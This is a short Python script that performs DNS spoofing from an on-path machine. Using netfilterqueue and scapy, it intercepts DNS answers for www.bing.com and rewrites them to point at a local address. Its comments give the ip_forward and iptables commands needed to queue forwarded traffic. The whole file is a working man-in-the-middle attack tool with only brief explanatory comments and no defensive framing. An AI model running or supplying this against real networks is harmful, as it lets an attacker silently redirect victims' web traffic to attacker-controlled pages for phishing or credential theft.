#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy


# Allow OnPath machine to forward spoofed machine's packets using:
# echo 1 > /proc/sys/net/ipv4/ip_forward

# modify iptables in order to queue packets in the onPath machine:
# iptables -I FORWARD -j NFQUEUE --queue-num 0

# when program ends: iptables --flush
# restore defaults


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "www.bing.com" in qname: #domain that we want to target
            print("[+] Spoofing target")
            answer=scapy.DNSRR(rrname=qname, rdata="192.168.175.144")#rdata -> page to display instead of bing
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1 #modify the number of answers expected to 1
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum
            packet.set_payload(str(scapy_packet))
    packet.accept()  # using drop here drops all packets
    # -> cut in the internet connection


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)  # binds the NetfilterQueue
# object to the created NetfilterQueue using its queue number
queue.run()
